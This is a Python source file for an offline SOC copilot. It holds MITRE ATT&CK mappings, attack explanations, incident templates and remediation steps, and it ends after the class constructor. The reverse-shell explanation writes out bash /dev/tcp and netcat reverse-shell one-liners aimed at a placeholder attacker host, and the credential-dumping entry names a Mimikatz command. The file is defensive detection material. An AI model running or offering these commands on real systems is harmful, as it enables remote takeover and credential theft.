"""SentinelX IDS - SOC Copilot.

AI-powered SOC assistant that works entirely offline using rule-based
analysis, template libraries, and heuristic scoring. No external API
keys required for core functionality.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any


@dataclass(frozen=True)
class MITREMapping:
    """Maps an attack type to MITRE ATT&CK framework references."""

    tactic: str
    technique_id: str
    technique_name: str
    description: str


# ---------------------------------------------------------------------------
# MITRE ATT&CK Mapping Database
# ---------------------------------------------------------------------------

MITRE_MAP: dict[str, MITREMapping] = {
    "brute_force": MITREMapping(
        tactic="Credential Access",
        technique_id="T1110",
        technique_name="Brute Force",
        description="Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.",
    ),
    "reverse_shell": MITREMapping(
        tactic="Execution",
        technique_id="T1059",
        technique_name="Command and Scripting Interpreter",
        description="Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries for reverse shell connections.",
    ),
    "privilege_escalation": MITREMapping(
        tactic="Privilege Escalation",
        technique_id="T1548",
        technique_name="Abuse Elevation Control Mechanism",
        description="Adversaries may circumvent mechanisms designed to control elevated privileges to gain higher-level permissions.",
    ),
    "lateral_movement": MITREMapping(
        tactic="Lateral Movement",
        technique_id="T1021",
        technique_name="Remote Services",
        description="Adversaries may use valid accounts to log into a service specifically designed to accept remote connections for lateral movement.",
    ),
    "port_scan": MITREMapping(
        tactic="Discovery",
        technique_id="T1046",
        technique_name="Network Service Discovery",
        description="Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices.",
    ),
    "data_exfiltration": MITREMapping(
        tactic="Exfiltration",
        technique_id="T1041",
        technique_name="Exfiltration Over C2 Channel",
        description="Adversaries may steal data by exfiltrating it over an existing command and control channel.",
    ),
    "webshell": MITREMapping(
        tactic="Persistence",
        technique_id="T1505.003",
        technique_name="Web Shell",
        description="Adversaries may backdoor web servers with web shells to establish persistent access to systems.",
    ),
    "encoded_powershell": MITREMapping(
        tactic="Execution",
        technique_id="T1059.001",
        technique_name="PowerShell",
        description="Adversaries may abuse PowerShell commands and scripts for execution, often encoding commands to evade detection.",
    ),
    "cryptominer": MITREMapping(
        tactic="Impact",
        technique_id="T1496",
        technique_name="Resource Hijacking",
        description="Adversaries may leverage the resources of co-opted systems to solve resource intensive problems, such as cryptocurrency mining.",
    ),
    "dns_tunneling": MITREMapping(
        tactic="Command and Control",
        technique_id="T1071.004",
        technique_name="DNS",
        description="Adversaries may communicate using the DNS protocol to avoid detection/network filtering by blending in with existing traffic.",
    ),
    "credential_dumping": MITREMapping(
        tactic="Credential Access",
        technique_id="T1003",
        technique_name="OS Credential Dumping",
        description="Adversaries may attempt to dump credentials to obtain account login and credential material from the operating system.",
    ),
    "sql_injection": MITREMapping(
        tactic="Initial Access",
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        description="Adversaries may attempt to exploit a weakness in an Internet-facing host or program using SQL injection to gain access.",
    ),
}

# ---------------------------------------------------------------------------
# Attack Explanation Database
# ---------------------------------------------------------------------------

ATTACK_EXPLANATIONS: dict[str, str] = {
    "brute_force": (
        "## Brute Force Attack\n\n"
        "A brute force attack is a trial-and-error method used to decode login "
        "credentials, encryption keys, or hidden web pages. Attackers systematically "
        "attempt every possible combination of passwords until the correct one is found.\n\n"
        "### Indicators\n"
        "- High volume of failed authentication attempts from a single source IP\n"
        "- Sequential or patterned username enumeration\n"
        "- Rapid connection attempts exceeding normal user behavior\n"
        "- Targeting of common service ports (22/SSH, 3389/RDP, 445/SMB)\n\n"
        "### Common Variants\n"
        "- **Simple Brute Force**: Trying every possible combination\n"
        "- **Dictionary Attack**: Using a wordlist of common passwords\n"
        "- **Credential Stuffing**: Using breached credential pairs\n"
        "- **Password Spraying**: Trying a few passwords across many accounts\n\n"
        "### Impact\n"
        "Unauthorized access to systems, data breach, lateral movement within the "
        "network, and potential full compromise of the target environment."
    ),
    "reverse_shell": (
        "## Reverse Shell Attack\n\n"
        "A reverse shell is a type of shell in which the target machine initiates "
        "a connection back to the attacker's machine. The attacker sets up a listener "
        "and waits for the victim to connect, effectively bypassing firewall rules "
        "that block incoming connections.\n\n"
        "### Indicators\n"
        "- Outbound connections to unusual ports or IPs\n"
        "- Processes spawning shells (/bin/bash, /bin/sh, cmd.exe, powershell.exe)\n"
        "- Network connections from web server processes\n"
        "- Use of common reverse shell tools (netcat, socat, msfvenom payloads)\n\n"
        "### Common Techniques\n"
        "- **Bash reverse shell**: `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`\n"
        "- **Python reverse shell**: Using socket and subprocess modules\n"
        "- **PowerShell reverse shell**: Encoded commands with `System.Net.Sockets`\n"
        "- **Netcat**: `nc -e /bin/sh ATTACKER PORT`\n\n"
        "### Impact\n"
        "Full remote command execution on the compromised host, data exfiltration, "
        "pivoting to other internal systems, and persistent backdoor access."
    ),
    "privilege_escalation": (
        "## Privilege Escalation\n\n"
        "Privilege escalation occurs when an attacker gains elevated access to resources "
        "that are normally protected. This typically follows initial compromise and is "
        "a critical step toward full system control.\n\n"
        "### Indicators\n"
        "- Unexpected sudo/su usage by low-privilege accounts\n"
        "- SUID/SGID binary exploitation attempts\n"
        "- Kernel exploit compilation or execution\n"
        "- Modification of /etc/passwd, /etc/shadow, or sudoers files\n"
        "- Token impersonation on Windows systems\n\n"
        "### Common Techniques\n"
        "- **Sudo misconfiguration**: Exploiting NOPASSWD entries\n"
        "- **SUID abuse**: Leveraging misconfigured SUID binaries\n"
        "- **Kernel exploits**: DirtyCOW, DirtyPipe, etc.\n"
        "- **Service account abuse**: Exploiting service-level permissions\n\n"
        "### Impact\n"
        "Root/SYSTEM-level access, full system compromise, ability to install "
        "persistent backdoors, and access to all data on the host."
    ),
    "lateral_movement": (
        "## Lateral Movement\n\n"
        "Lateral movement refers to techniques that adversaries use to move through a "
        "network after gaining initial access. The goal is to identify and gain access "
        "to sensitive data and high-value assets.\n\n"
        "### Indicators\n"
        "- Internal SSH/RDP connections from compromised hosts\n"
        "- Pass-the-Hash or Pass-the-Ticket authentication patterns\n"
        "- Unusual SMB/WinRM connections between workstations\n"
        "- Credential usage on systems not normally accessed by that account\n\n"
        "### Common Techniques\n"
        "- **Pass-the-Hash**: Authenticating using NTLM hash directly\n"
        "- **PsExec / SMBExec**: Remote execution via Windows admin shares\n"
        "- **WMI / WinRM**: Using Windows management for remote execution\n"
        "- **SSH Key Theft**: Stealing keys for horizontal movement\n\n"
        "### Impact\n"
        "Access to additional systems and data, domain compromise, and ability to "
        "reach high-value targets such as domain controllers and database servers."
    ),
    "port_scan": (
        "## Port Scanning\n\n"
        "Port scanning is a reconnaissance technique used to identify open ports and "
        "services running on target systems. It is typically the first step in mapping "
        "out an attack surface.\n\n"
        "### Indicators\n"
        "- Rapid connection attempts to multiple ports on one or more hosts\n"
        "- SYN packets without completing TCP handshake (SYN scan)\n"
        "- Sequential or well-known port targeting\n"
        "- Single source IP contacting many destination ports\n\n"
        "### Common Types\n"
        "- **SYN Scan**: Half-open scanning, fast and stealthy\n"
        "- **TCP Connect**: Full TCP handshake for each port\n"
        "- **UDP Scan**: Scanning UDP services (DNS, SNMP)\n"
        "- **Service Detection**: Banner grabbing for version info\n\n"
        "### Impact\n"
        "Information disclosure about running services and versions, identification "
        "of vulnerable services, and network topology mapping."
    ),
    "data_exfiltration": (
        "## Data Exfiltration\n\n"
        "Data exfiltration is the unauthorized transfer of data from an organization. "
        "Attackers employ various techniques to move data out of the network while "
        "evading detection systems.\n\n"
        "### Indicators\n"
        "- Large outbound data transfers to external IPs\n"
        "- DNS tunneling with unusually long subdomain queries\n"
        "- Connections to known file-sharing or cloud storage services\n"
        "- Encrypted traffic to non-standard ports\n"
        "- Compressed/archived file creation before transfer\n\n"
        "### Common Techniques\n"
        "- **HTTP/HTTPS Upload**: Posting data to attacker-controlled servers\n"
        "- **DNS Tunneling**: Encoding data in DNS queries\n"
        "- **FTP/SCP**: Direct file transfer to external systems\n"
        "- **Steganography**: Hiding data within images or files\n\n"
        "### Impact\n"
        "Loss of sensitive data including customer records, intellectual property, "
        "financial data, and trade secrets. Regulatory and legal consequences."
    ),
    "webshell": (
        "## Web Shell Attack\n\n"
        "A web shell is a malicious script uploaded to a web server that enables "
        "remote administration and command execution. Web shells provide persistent "
        "backdoor access to compromised servers.\n\n"
        "### Indicators\n"
        "- HTTP requests to unusual file paths (e.g., /uploads/shell.php)\n"
        "- Command execution parameters in URL queries (cmd=, exec=)\n"
        "- POST requests with encoded payloads to script files\n"
        "- New or modified script files in web-accessible directories\n\n"
        "### Common Variants\n"
        "- **PHP**: C99, r57, WSO shells\n"
        "- **ASP/ASPX**: China Chopper, ASPX Spy\n"
        "- **JSP**: JspSpy, Godzilla\n"
        "- **Python/Perl**: CGI-based shells\n\n"
        "### Impact\n"
        "Persistent server access, command execution, data theft, defacement, "
        "and use of the server as a pivot point for further attacks."
    ),
    "encoded_powershell": (
        "## Encoded PowerShell Execution\n\n"
        "Attackers use Base64-encoded PowerShell commands to evade signature-based "
        "detection. The `-EncodedCommand` flag allows execution of obfuscated scripts "
        "that bypass many security controls.\n\n"
        "### Indicators\n"
        "- PowerShell processes with `-enc` or `-EncodedCommand` flags\n"
        "- Long Base64 strings in command-line arguments\n"
        "- PowerShell launching from unusual parent processes\n"
        "- Download cradles (IEX, Invoke-Expression, Net.WebClient)\n\n"
        "### Common Payloads\n"
        "- **Download cradle**: Downloading and executing remote scripts\n"
        "- **Reverse shell**: Establishing C2 channel\n"
        "- **Mimikatz**: In-memory credential dumping\n"
        "- **AMSI bypass**: Disabling antimalware scanning\n\n"
        "### Impact\n"
        "Arbitrary code execution, credential theft, defense evasion, and "
        "deployment of additional malware or ransomware."
    ),
    "cryptominer": (
        "## Cryptominer Detection\n\n"
        "Cryptominers are malicious programs that hijack system resources to mine "
        "cryptocurrency. They can run as processes, scripts, or browser-based miners, "
        "degrading system performance and increasing costs.\n\n"
        "### Indicators\n"
        "- High CPU usage by unknown processes\n"
        "- Connections to known mining pool domains/IPs\n"
        "- Stratum protocol traffic (stratum+tcp://)\n"
        "- Processes named xmrig, minerd, cpuminer, etc.\n\n"
        "### Common Techniques\n"
        "- **Process-based**: Standalone mining executables\n"
        "- **Fileless**: In-memory PowerShell miners\n"
        "- **Container escape**: Mining within Kubernetes pods\n"
        "- **Browser-based**: JavaScript miners (CoinHive-style)\n\n"
        "### Impact\n"
        "Resource exhaustion, increased cloud compute costs, degraded service "
        "performance, and potential indicator of deeper compromise."
    ),
    "dns_tunneling": (
        "## DNS Tunneling\n\n"
        "DNS tunneling exploits the DNS protocol to encode data within DNS queries "
        "and responses. Since DNS traffic is often allowed through firewalls, it "
        "provides a covert communication channel.\n\n"
        "### Indicators\n"
        "- Unusually long DNS query names (>50 characters)\n"
        "- High volume of DNS TXT record queries\n"
        "- DNS queries with high entropy subdomain labels\n"
        "- Single client generating abnormal DNS traffic volume\n\n"
        "### Common Tools\n"
        "- **iodine**: IP-over-DNS tunneling\n"
        "- **dnscat2**: C2 channel over DNS\n"
        "- **DNSExfiltrator**: Data exfiltration via DNS\n\n"
        "### Impact\n"
        "Data exfiltration bypassing network controls, covert command and control "
        "channels, and persistent access bypassing firewall rules."
    ),
    "credential_dumping": (
        "## Credential Dumping\n\n"
        "Credential dumping is the process of extracting account credentials "
        "(passwords, hashes, tickets) from the operating system and software. "
        "These credentials enable attackers to move laterally and escalate privileges.\n\n"
        "### Indicators\n"
        "- Access to LSASS process memory\n"
        "- Reading SAM/SECURITY/SYSTEM registry hives\n"
        "- Mimikatz, LaZagne, or similar tool execution\n"
        "- Unusual access to /etc/shadow on Linux\n\n"
        "### Common Techniques\n"
        "- **Mimikatz**: sekurlsa::logonpasswords\n"
        "- **ProcDump**: Dumping LSASS memory\n"
        "- **Ntdsutil**: Active Directory database extraction\n"
        "- **Hashdump**: Extracting local password hashes\n\n"
        "### Impact\n"
        "Complete credential compromise, ability to impersonate users, domain "
        "admin access, and full network compromise."
    ),
    "sql_injection": (
        "## SQL Injection\n\n"
        "SQL injection is a code injection technique that exploits security "
        "vulnerabilities in web application database layers. Attackers inject "
        "malicious SQL statements into input fields to manipulate queries.\n\n"
        "### Indicators\n"
        "- SQL keywords in HTTP parameters (UNION, SELECT, DROP, --, ')\n"
        "- Error messages containing database information\n"
        "- Time-based blind injection delays\n"
        "- Unusual database query patterns\n\n"
        "### Common Techniques\n"
        "- **Union-based**: Combining results with UNION SELECT\n"
        "- **Blind injection**: Boolean or time-based inference\n"
        "- **Error-based**: Extracting data through error messages\n"
        "- **Out-of-band**: Using DNS/HTTP to extract data\n\n"
        "### Impact\n"
        "Data breach, authentication bypass, database modification or destruction, "
        "and potential server compromise through xp_cmdshell or similar."
    ),
}

# ---------------------------------------------------------------------------
# Incident Analysis Templates
# ---------------------------------------------------------------------------

INCIDENT_TEMPLATES: dict[str, str] = {
    "brute_force": (
        "🚨 **INCIDENT ANALYSIS: SSH Brute Force Attack**\n\n"
        "**What Happened:** A brute force attack was detected originating from "
        "{source_ip}. The attacker attempted {attempt_count} login attempts "
        "targeting the SSH service on {target_host}.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: {severity}\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: {impact}\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "reverse_shell": (
        "🚨 **INCIDENT ANALYSIS: Reverse Shell Detected**\n\n"
        "**What Happened:** A reverse shell connection was detected on {target_host}. "
        "The host appears to be initiating an outbound connection to {dest_ip}:{dest_port} "
        "with shell spawning activity.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: CRITICAL\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Full system compromise likely\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "privilege_escalation": (
        "🚨 **INCIDENT ANALYSIS: Privilege Escalation Attempt**\n\n"
        "**What Happened:** Privilege escalation activity was detected on {target_host}. "
        "User '{username}' attempted to gain elevated privileges via {escalation_method}.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: {severity}\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Potential full system compromise\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "lateral_movement": (
        "🚨 **INCIDENT ANALYSIS: Lateral Movement Detected**\n\n"
        "**What Happened:** Lateral movement activity was detected. Source {source_ip} "
        "is attempting to access {target_host} using {protocol}. This may indicate "
        "an attacker pivoting through the network.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: HIGH\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Potential multi-system compromise\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "port_scan": (
        "🔍 **INCIDENT ANALYSIS: Port Scan Detected**\n\n"
        "**What Happened:** Port scanning activity was detected from {source_ip} "
        "targeting {target_host}. Approximately {port_count} ports were probed "
        "within {timeframe}.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: {severity}\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Reconnaissance preceding potential attack\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "data_exfiltration": (
        "🚨 **INCIDENT ANALYSIS: Data Exfiltration Suspected**\n\n"
        "**What Happened:** Potential data exfiltration was detected from {source_host}. "
        "Unusual outbound data transfer of approximately {data_volume} was observed "
        "to {dest_ip}.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: CRITICAL\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Potential data breach\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "webshell": (
        "🚨 **INCIDENT ANALYSIS: Web Shell Activity**\n\n"
        "**What Happened:** Web shell activity was detected on {target_host}. "
        "Suspicious requests containing command execution patterns were observed "
        "targeting {url_path}.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: CRITICAL\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Full web server compromise\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "encoded_powershell": (
        "🚨 **INCIDENT ANALYSIS: Encoded PowerShell Execution**\n\n"
        "**What Happened:** Base64-encoded PowerShell execution was detected on "
        "{target_host}. This is a common technique used by attackers to obfuscate "
        "malicious commands.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: HIGH\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Potential code execution and malware deployment\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "cryptominer": (
        "⛏️ **INCIDENT ANALYSIS: Cryptominer Detected**\n\n"
        "**What Happened:** Cryptocurrency mining activity was detected on {target_host}. "
        "Connections to mining pool infrastructure or mining process execution "
        "were identified.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: MEDIUM\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Resource abuse, potential deeper compromise\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "dns_tunneling": (
        "🚨 **INCIDENT ANALYSIS: DNS Tunneling Detected**\n\n"
        "**What Happened:** DNS tunneling activity was detected from {source_host}. "
        "Anomalously long DNS queries with high entropy were observed, suggesting "
        "data exfiltration or C2 communication via DNS.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: HIGH\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Covert data exfiltration or C2 channel\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "credential_dumping": (
        "🚨 **INCIDENT ANALYSIS: Credential Dumping Detected**\n\n"
        "**What Happened:** Credential dumping activity was detected on {target_host}. "
        "Access to sensitive credential stores or use of credential extraction tools "
        "was observed.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: CRITICAL\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Full credential compromise, potential domain takeover\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
    "sql_injection": (
        "🚨 **INCIDENT ANALYSIS: SQL Injection Attempt**\n\n"
        "**What Happened:** SQL injection attempts were detected targeting {target_host}. "
        "Malicious SQL payloads were observed in HTTP request parameters from {source_ip}.\n\n"
        "**Risk Assessment:** {risk_level}\n"
        "- Severity: HIGH\n"
        "- Confidence: {confidence}\n"
        "- Business Impact: Potential data breach and database compromise\n\n"
        "**MITRE ATT&CK:** {mitre_tactic} / {mitre_technique} ({mitre_id})\n\n"
        "**Recommended Actions:**\n"
        "{actions}\n"
    ),
}

# ---------------------------------------------------------------------------
# Remediation Steps Database
# ---------------------------------------------------------------------------

REMEDIATION_STEPS: dict[str, list[str]] = {
    "brute_force": [
        "1. IMMEDIATE: Block the source IP address ({source_ip}) at the firewall/WAF",
        "2. IMMEDIATE: Verify no successful authentication occurred from this source",
        "3. SHORT-TERM: Enable account lockout policies (lock after 5 failed attempts)",
        "4. SHORT-TERM: Implement rate limiting on authentication endpoints",
        "5. MEDIUM-TERM: Deploy multi-factor authentication (MFA) for all SSH access",
        "6. MEDIUM-TERM: Configure fail2ban or similar intrusion prevention",
        "7. LONG-TERM: Move SSH to non-standard port or restrict to VPN-only access",
        "8. LONG-TERM: Implement certificate-based authentication and disable password auth",
    ],
    "reverse_shell": [
        "1. IMMEDIATE: Isolate the compromised host from the network",
        "2. IMMEDIATE: Kill the reverse shell process and associated connections",
        "3. IMMEDIATE: Block outbound connection to the attacker IP at the firewall",
        "4. SHORT-TERM: Perform full malware scan and rootkit detection on the host",
        "5. SHORT-TERM: Review all running processes and network connections on the host",
        "6. MEDIUM-TERM: Investigate initial access vector (how the shell was deployed)",
        "7. MEDIUM-TERM: Check for persistence mechanisms (crontabs, startup scripts)",
        "8. LONG-TERM: Implement egress filtering and application-level firewalling",
    ],
    "privilege_escalation": [
        "1. IMMEDIATE: Disable the affected user account",
        "2. IMMEDIATE: Audit all actions performed with elevated privileges",
        "3. SHORT-TERM: Review and harden sudo configuration (remove NOPASSWD entries)",
        "4. SHORT-TERM: Check for modified SUID/SGID binaries",
        "5. MEDIUM-TERM: Apply latest kernel and software security patches",
        "6. MEDIUM-TERM: Implement mandatory access controls (SELinux/AppArmor)",
        "7. LONG-TERM: Deploy endpoint detection and response (EDR) solutions",
        "8. LONG-TERM: Implement least-privilege access model across all systems",
    ],
    "lateral_movement": [
        "1. IMMEDIATE: Isolate affected systems from the network",
        "2. IMMEDIATE: Reset credentials for compromised accounts",
        "3. SHORT-TERM: Review authentication logs on all systems accessed by the source",
        "4. SHORT-TERM: Scan for additional compromised hosts in the same subnet",
        "5. MEDIUM-TERM: Implement network segmentation to limit lateral movement paths",
        "6. MEDIUM-TERM: Deploy network detection and response (NDR) between segments",
        "7. LONG-TERM: Implement zero-trust architecture with micro-segmentation",
        "8. LONG-TERM: Deploy Privileged Access Management (PAM) solutions",
    ],
    "port_scan": [
        "1. IMMEDIATE: Monitor the scanning source IP for follow-up attack activity",
        "2. SHORT-TERM: Block the source IP if external and not legitimate scanner",
        "3. SHORT-TERM: Verify all detected open ports are intentionally exposed",
        "4. MEDIUM-TERM: Review firewall rules and close unnecessary ports",
        "5. MEDIUM-TERM: Implement port knocking or SPA for sensitive services",
        "6. LONG-TERM: Deploy honeypots to detect and track scanning activity",
        "7. LONG-TERM: Implement network-level IPS to auto-block scan patterns",
    ],
    "data_exfiltration": [
        "1. IMMEDIATE: Block the destination IP/domain at the firewall",
        "2. IMMEDIATE: Isolate the source host to prevent further data loss",
        "3. IMMEDIATE: Identify and classify the data that may have been exfiltrated",
        "4. SHORT-TERM: Preserve forensic evidence (memory dump, disk image)",
        "5. SHORT-TERM: Review DLP logs and proxy logs for exfiltration scope",
        "6. MEDIUM-TERM: Notify legal/compliance if sensitive data was compromised",
        "7. MEDIUM-TERM: Implement DLP controls on egress points",
        "8. LONG-TERM: Deploy UEBA to detect anomalous data access patterns",
    ],
    "webshell": [
        "1. IMMEDIATE: Remove or quarantine the identified web shell file",
        "2. IMMEDIATE: Block the attacker IP at the WAF/firewall",
        "3. SHORT-TERM: Audit all files in web-accessible directories for changes",
        "4. SHORT-TERM: Review web server access logs for scope of compromise",
        "5. MEDIUM-TERM: Patch the vulnerability used to upload the web shell",
        "6. MEDIUM-TERM: Implement file integrity monitoring on web directories",
        "7. LONG-TERM: Deploy WAF with upload validation and file-type restrictions",
        "8. LONG-TERM: Implement runtime application self-protection (RASP)",
    ],
    "encoded_powershell": [
        "1. IMMEDIATE: Kill the PowerShell process and investigate child processes",
        "2. IMMEDIATE: Isolate the host if malicious activity confirmed",
        "3. SHORT-TERM: Decode and analyze the Base64 payload to understand intent",
        "4. SHORT-TERM: Check for persistence mechanisms created by the script",
        "5. MEDIUM-TERM: Enable PowerShell Script Block Logging (Event ID 4104)",
        "6. MEDIUM-TERM: Enable Constrained Language Mode for PowerShell",
        "7. LONG-TERM: Implement application whitelisting (AppLocker/WDAC)",
        "8. LONG-TERM: Deploy EDR with PowerShell AMSI integration",
    ],
    "cryptominer": [
        "1. IMMEDIATE: Kill the mining process and remove associated binaries",
        "2. IMMEDIATE: Block connections to known mining pool domains/IPs",
        "3. SHORT-TERM: Investigate how the miner was deployed (initial access vector)",
        "4. SHORT-TERM: Check for additional compromised hosts running miners",
        "5. MEDIUM-TERM: Review container/cloud configurations for misconfigurations",
        "6. MEDIUM-TERM: Implement resource usage monitoring and alerting",
        "7. LONG-TERM: Deploy endpoint protection with cryptominer detection",
    ],
    "dns_tunneling": [
        "1. IMMEDIATE: Block DNS queries to the suspicious domain",
        "2. IMMEDIATE: Isolate the affected host for investigation",
        "3. SHORT-TERM: Analyze DNS query logs to determine data exfiltration scope",
        "4. SHORT-TERM: Implement DNS query length and entropy thresholds",
        "5. MEDIUM-TERM: Deploy DNS security solutions (DNS firewall/RPZ)",
        "6. MEDIUM-TERM: Force all DNS through monitored resolvers",
        "7. LONG-TERM: Implement DNS-over-HTTPS inspection capabilities",
    ],
    "credential_dumping": [
        "1. IMMEDIATE: Isolate the affected host from the network",
        "2. IMMEDIATE: Reset ALL credentials that may have been compromised",
        "3. IMMEDIATE: Revoke active sessions for affected accounts",
        "4. SHORT-TERM: Enable credential guard on Windows systems",
        "5. SHORT-TERM: Review all authentication activity for compromised accounts",
        "6. MEDIUM-TERM: Implement LSASS protection rules",
        "7. MEDIUM-TERM: Deploy privileged access workstations (PAWs)",
        "8. LONG-TERM: Implement tiered administration model",
    ],
    "sql_injection": [
        "1. IMMEDIATE: Block the attacking source IP at the WAF",
        "2. IMMEDIATE: Review database logs for successful exploitation",
        "3. SHORT-TERM: Patch the vulnerable application code with parameterized queries",
        "4. SHORT-TERM: Audit database for unauthorized changes or data access",
        "5. MEDIUM-TERM: Deploy WAF with SQL injection rule sets",
        "6. MEDIUM-TERM: Implement input validation and output encoding",
        "7. LONG-TERM: Perform regular application security testing (SAST/DAST)",
        "8. LONG-TERM: Implement database activity monitoring (DAM)",
    ],
}

# ---------------------------------------------------------------------------
# Query-Answer Template Database
# ---------------------------------------------------------------------------

QUERY_TEMPLATES: dict[str, str] = {
    "how to investigate": (
        "To investigate this alert:\n"
        "1. Review the raw log entries associated with the event\n"
        "2. Check the source IP reputation using threat intelligence feeds\n"
        "3. Correlate with other events from the same source or target\n"
        "4. Examine network flow data for the relevant timeframe\n"
        "5. Check if the target system shows signs of compromise\n"
        "6. Document findings and escalate if confirmed malicious"
    ),
    "false positive": (
        "To determine if this is a false positive:\n"
        "1. Verify if the source IP belongs to a known legitimate scanner or service\n"
        "2. Check if this activity aligns with scheduled security scans or maintenance\n"
        "3. Review historical data — is this pattern normal for this source?\n"
        "4. Validate with the system/application owner if the activity is expected\n"
        "5. Check if the detection rule has a high false positive rate historically\n"
        "6. If confirmed as false positive, add to the allowlist with documentation"
    ),
    "severity": (
        "Alert severity breakdown:\n"
        "- **CRITICAL**: Active exploitation, data breach in progress, or system compromise confirmed\n"
        "- **HIGH**: Likely malicious activity requiring immediate investigation\n"
        "- **MEDIUM**: Suspicious activity that may indicate reconnaissance or attempted attacks\n"
        "- **LOW**: Informational events that may be worth monitoring but pose minimal immediate risk"
    ),
    "mitre": (
        "MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics "
        "and techniques based on real-world observations. It is organized by:\n"
        "- **Tactics**: The adversary's technical goals (e.g., Initial Access, Execution)\n"
        "- **Techniques**: How the adversary achieves the tactic goals\n"
        "- **Sub-techniques**: More specific descriptions of adversary behavior\n"
        "- **Procedures**: Specific implementations observed in the wild\n\n"
        "SentinelX maps all detections to MITRE ATT&CK for standardized classification."
    ),
    "escalate": (
        "Escalation procedure:\n"
        "1. Document all findings with timestamps and evidence\n"
        "2. Classify the incident severity (P1-P4)\n"
        "3. Notify the SOC team lead or incident commander\n"
        "4. For P1/P2: Activate incident response procedures\n"
        "5. For confirmed breaches: Engage legal and executive leadership\n"
        "6. Preserve all forensic evidence before remediation"
    ),
    "remediation": (
        "General remediation steps:\n"
        "1. **Contain**: Isolate affected systems to prevent spread\n"
        "2. **Eradicate**: Remove malware, close vulnerabilities, reset credentials\n"
        "3. **Recover**: Restore systems from clean backups if necessary\n"
        "4. **Validate**: Confirm the threat has been fully addressed\n"
        "5. **Document**: Record all actions taken and lessons learned\n"
        "6. **Improve**: Update detection rules and security controls"
    ),
    "what is": (
        "SentinelX IDS is an AI-powered Intrusion Detection System that monitors "
        "your network and systems for suspicious activity. It uses rule-based detection, "
        "anomaly scoring, and event correlation to identify threats in real-time."
    ),
    "help": (
        "I can help you with:\n"
        "- **Alert Analysis**: Explain what an alert means and its severity\n"
        "- **Attack Explanations**: Detailed breakdown of attack techniques\n"
        "- **Remediation**: Step-by-step remediation guidance\n"
        "- **Investigation**: How to investigate specific alert types\n"
        "- **MITRE ATT&CK**: Map events to the ATT&CK framework\n"
        "- **False Positives**: Help determine if an alert is legitimate\n"
        "- **Escalation**: When and how to escalate incidents"
    ),
}

# ---------------------------------------------------------------------------
# Risk Scoring Weights
# ---------------------------------------------------------------------------

SEVERITY_WEIGHTS: dict[str, float] = {
    "critical": 1.0,
    "high": 0.8,
    "medium": 0.5,
    "low": 0.2,
    "informational": 0.1,
}

TARGET_CRITICALITY: dict[str, float] = {
    "domain_controller": 1.0,
    "database_server": 0.95,
    "web_server": 0.7,
    "mail_server": 0.75,
    "file_server": 0.6,
    "workstation": 0.3,
    "development": 0.4,
    "unknown": 0.5,
}


class SOCCopilot:
    """AI-powered SOC assistant providing analysis, explanations, and recommendations.

    Works entirely offline without external API keys. Uses rule-based analysis,
    template libraries, and heuristic risk scoring to provide actionable intelligence.
    """

    def __init__(self) -> None:
        self._mitre_map: dict[str, MITREMapping] = MITRE_MAP
        self._attack_explanations: dict[str, str] = ATTACK_EXPLANATIONS
